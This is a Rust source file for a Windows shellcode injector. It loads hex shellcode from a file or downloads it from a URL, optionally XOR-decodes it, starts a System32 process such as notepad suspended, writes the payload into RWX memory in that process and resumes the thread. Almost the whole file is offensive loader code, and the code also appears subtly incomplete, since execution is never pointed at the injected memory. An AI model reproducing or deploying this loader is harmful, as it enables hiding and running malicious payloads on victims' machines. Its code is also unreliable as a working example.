use std::env;
use std::fs;
use std::io::{ self, Read };
use std::process;
use winapi::um::memoryapi::{ VirtualAllocEx, WriteProcessMemory };
use winapi::um::processthreadsapi::{ CreateProcessW, ResumeThread };
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{ MEM_COMMIT, PAGE_EXECUTE_READWRITE, PROCESS_INFORMATION, STARTUPINFOW };
use reqwest;

// Function to parse shellcode from a file
fn parser(filename: &str) -> io::Result<Vec<u8>> {
    let content = fs::read_to_string(filename)?;
    let bytes: Vec<u8> = content
        .as_bytes()
        .chunks(2)
        .filter_map(|chunk| {
            let s = std::str::from_utf8(chunk).ok()?;
            u8::from_str_radix(s, 16).ok()
        })
        .collect();
    Ok(bytes)
}

// Function to XOR decrypt the shellcode
fn xor(data: &mut Vec<u8>, key: &[u8]) {
    for (i, byte) in data.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
}

// Function to inject shellcode into a process
fn injector(h_process: *mut std::ffi::c_void, shellcode: &[u8]) -> bool {
    let shell_size = shellcode.len();
    let shell_address = unsafe {
        VirtualAllocEx(
            h_process,
            std::ptr::null_mut(),
            shell_size,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        )
    };
    if shell_address.is_null() {
        return false;
    }
    let success = unsafe {
        WriteProcessMemory(
            h_process,
            shell_address,
            shellcode.as_ptr() as *const _,
            shell_size,
            std::ptr::null_mut()
        )
    };
    success != 0
}

// Function to fetch remote shellcode
fn fetch_remote_shellcode(url: &str) -> io::Result<Vec<u8>> {
    let response = reqwest::blocking::get(url)?.bytes()?;
    Ok(response.to_vec())
}

fn main() {
    let args: Vec<String> = env::args().collect();

    let mut input_content = String::new();
    let mut remote_url = String::new();
    let mut xor_key = Vec::new();
    let mut process_path = "C:\\Windows\\System32\\notepad.exe".to_string();

    for i in 1..args.len() {
        match args[i].as_str() {
            "-i" => {
                if i + 1 < args.len() {
                    input_content = args[i + 1].clone();
                }
            }
            "-u" => {
                if i + 1 < args.len() {
                    remote_url = args[i + 1].clone();
                }
            }
            "-x" => {
                if i + 1 < args.len() {
                    xor_key = args[i + 1].bytes().collect();
                }
            }
            "-p" => {
                if i + 1 < args.len() {
                    process_path = format!("C:\\Windows\\System32\\{}", args[i + 1]);
                }
            }
            "-h" => {
                println!("Usage: injector [options]");
                println!("Options:");
                println!("-i <filename> : Input file with shellcode in hex format");
                println!(
                    "-u <url>      : Fetch remote shellcode from the specified URL in hex format"
                );
                println!("-p <process>  : Name of a process (optional, default is notepad)");
                println!("-x <key>      : Apply XOR decryption with the specified key (optional)");
                println!("-h            : Display this help menu");
                process::exit(0);
            }
            _ => {}
        }
    }

    let mut payload = if !input_content.is_empty() {
        parser(&input_content).expect("Failed to parse input content")
    } else if !remote_url.is_empty() {
        fetch_remote_shellcode(&remote_url).expect("Failed to fetch remote shellcode")
    } else {
        eprintln!(
            "Please specify an input file or remote file location with hex shellcode. Use -h for help menu."
        );
        process::exit(1);
    };

    if !xor_key.is_empty() {
        xor(&mut payload, &xor_key);
    }

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let process = std::ffi::OsString
        ::from(process_path)
        .as_os_str()
        .encode_wide()
        .chain(std::iter::once(0))
        .collect::<Vec<_>>();

    let success = unsafe {
        CreateProcessW(
            process.as_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            false as i32,
            CREATE_SUSPENDED,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi
        )
    };

    if success == 0 {
        eprintln!("Failed to create process");
        process::exit(1);
    }

    if !injector(pi.hProcess, &payload) {
        eprintln!("Failed to inject shellcode");
        process::exit(1);
    }

    unsafe {
        ResumeThread(pi.hThread);
    }
}
